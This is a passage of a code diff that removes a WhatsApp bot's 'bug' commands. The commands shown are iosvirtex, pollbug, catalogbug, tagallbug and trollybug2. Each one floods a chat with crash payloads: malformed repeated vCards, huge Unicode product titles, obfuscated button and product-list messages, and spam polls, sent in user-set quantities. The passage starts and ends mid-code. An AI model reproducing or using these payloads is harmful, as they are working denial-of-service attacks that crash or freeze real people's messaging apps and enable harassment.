karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
-QueenNilu.sendContact(m.chat, global.owner, fakeContacts)
-}
-}
-break
-case 'iosvirtex': {
-           	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
-amount = `${encodeURI(q)}`
-for (let i = 0; i < amount; i++) {
-QueenNilu.sendMessage(m.chat, { image: { url: 'https://i.ibb.co/zSQFF5F/Nukleal.jpg' }, caption: `${ownername} ${iphone}` }, { quoted: doc })
-}
-}
-break
-case 'iosvirtex5': {
-           	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-if (args.length == 0) return m.reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
-amount = `${encodeURI(q)}`
-for (let i = 0; i < amount; i++) {
-QueenNilu.sendMessage(m.chat, { image: { url: 'https://i.ibb.co/zSQFF5F/Nukleal.jpg' }, caption: `${ownername} ${iphone5}` }, { quoted: doc })
-}
-}
-break
-case '🌷':{
-           	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-if (args.length == 0) return m.reply(`Amount?\nExample ${prefix+command} 5`)
-amount = `${encodeURI(q)}`
-ydd = `${botname}`
-for (let i = 0; i < amount; i++) {
-function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage',' 50767666664','771192XPifQJ',' 50767666664','${ownername}\x20🦄?','45FHicsI','2213460MCRxLU','AH\x20EZ','350069CkDHKE','reply\x20CRASH','https://chat.whatsapp.com/HYj9wu5Jrv6CROxyeQbHoS','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await QueenNilu[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'JOIN\x20XEON\x20GROUP\x20CHAT','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'X\x20BUG\x20EZZZ','id':_0x47bf3a(0x153)}}]}));
- await sleep(20)
-}
-}
-break
-case 'tagallbug': {
-           	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-                if (!m.isGroup) return m.reply(mess.group)
-if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
-amount = `${encodeURI(q)}`
-ydd = `${botname}`
-for (let i = 0; i < amount; i++) {
-let teks = `══✪〘 * TAGALL LMAO 🦄* 〙✪══
- ${themeemoji} *Message : ${q ? q : 'empty'}*\n\n`
-for (let mem of participants) {
-teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
-QueenNilu.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })}
-}
-}
-break
-case 'pollbug': {
-           	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
-amount = `${encodeURI(q)}`
-ydd = `${botname}`
-for (let i = 0; i < amount; i++) {
-var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-"pollCreationMessage": {
-"name": ownername,
-"options": [
-{
-"optionName": `${themeemoji}`
-},
-{
-"optionName": `${themeemoji}`
-},
-{
-"optionName": `${themeemoji}`
-},
-{
-"optionName": `${themeemoji}`
-},
-{
-"optionName": `${themeemoji}`
-}
-],
-"selectableOptionsCount": 5
-}
-}), { userJid: m.chat, quoted: doc })
-QueenNilu.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
-}
-xbug('Successful in sending the poll bug')
-}
-break
-
-case 'catalogbug': {
-
-                if (!isCreator) return m.reply(`${mess.owner}`)
-                if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
-var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xpicvirus.png') }, { upload: QueenNilu.waUploadToServer })
-amount = `${encodeURI(q)}`
-for (let i = 0; i < amount; i++) {
-var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-"productMessage": {
-"product": {
-"productImage": messa.imageMessage,
-"productId": "449756950375071",
-"title": `[⫹⫺ - 㑒 ${botname}]\ 🦇̣̣̣̣̣̣̣̣⃟   ...𝛀..𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦??𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦??𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦??𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦`,
-"description": wm,
-"currencyCode": "INR",
-"footerText": ownername,
-"priceAmount1000": "10000000",
-"productImageCount": 1,
-"firstImageId": 1,
-"salePriceAmount1000": "10000000",
-"retailerId": wm,
-"url": websitex
-},
-"businessOwnerJid": "916909137213@s.whatsapp.net",
-}
-}), { userJid: m.chat, quoted: doc })
-QueenNilu.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
-}
-}
-break
-case 'trollybug2': {
-
-                if (!isCreator) return m.reply(`${mess.owner}`)
-                if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
-amount = `${encodeURI(q)}`
-for (let i = 0; i < amount; i++) {
-function _0x4279(){const _0x4c3178=['fromObject','Message','1847261837216262824','73652izvGmz','1847261837216262829','1910200oYNAKN','Xeon\x20Bug\x20WhatsApp','1847261837216262','331958AouuTv','key','7007318245952499','890188DtEJNR','0@s.whatsapp.net','1847261837216269','sendMessage','258issmFR','1210MrdGTJ','184726183721626282','36XHGsdh','184726183721626','156QxEJPM','2092328zHiLqt','18472618372162628','18472618372162627','56945YMXtkC','PRODUCT_LIST','chat','3309880sRCSRt',' 916909137213@s.whatsapp.net'];_0x4279=function(){return _0x4c3178;};return _0x4279();}const _0x588892=_0x54e7;function _0x54e7(_0x45a980,_0x39b46a){const _0x4279b=_0x4279();return _0x54e7=function(_0x54e7ef,_0x201079){_0x54e7ef=_0x54e7ef-0x1f0;let _0x13064e=_0x4279b[_0x54e7ef];return _0x13064e;},_0x54e7(_0x45a980,_0x39b46a);}(function(_0x2a139b,_0x2b4728){const _0x1838e0=_0x54e7,_0x425404=_0x2a139b();while(!![]){try{const _0x5b3fe2=-parseInt(_0x1838e0(0x201))/0x1+-parseInt(_0x1838e0(0x1fb))/0x2+-parseInt(_0x1838e0(0x20a))/0x3*(-parseInt(_0x1838e0(0x1f9))/0x4)+-parseInt(_0x1838e0(0x1f1))/0x5*(parseInt(_0x1838e0(0x205))/0x6)+-parseInt(_0x1838e0(0x1f4))/0x7+parseInt(_0x1838e0(0x20b))/0x8*(-parseInt(_0x1838e0(0x208))/0x9)+parseInt(_0x1838e0(0x206))/0xa*(parseInt(_0x1838e0(0x1fe))/0xb);if(_0x5b3fe2===_0x2b4728)break;else _0x425404['push'](_0x425404['shift']());}catch(_0x103dcc){_0x425404['push'](_0x425404['shift']());}}}(_0x4279,0xb8533),a=await QueenNilu[_0x588892(0x204)](m[_0x588892(0x1f3)],{'react':{'key':{'remoteJid':m[_0x588892(0x1f3)],'fromMe':!![],'id':m[_0x588892(0x1ff)]['id']}}}));let doko={'key':{'participant':_0x588892(0x202)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':xpicvirus}}};var xeonordy=generateWAMessageFromContent(m['chat'],proto[_0x588892(0x1f7)][_0x588892(0x1f6)]({'listMessage':{'title':''+xeonbutton2,'description':_0x588892(0x1fc)+xeonbutton2,'thumbnail':xpicvirus,'buttonText':'','listType':_0x588892(0x1f2),'productListInfo':{'productSections':[{'title':''+xeonbutton2,'products':[{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216262'},{'productId':'1847261837216262244'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262829'},{'productId':_0x588892(0x1f8)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':'184726183721626282'},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x1f0)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x1fd)},{'p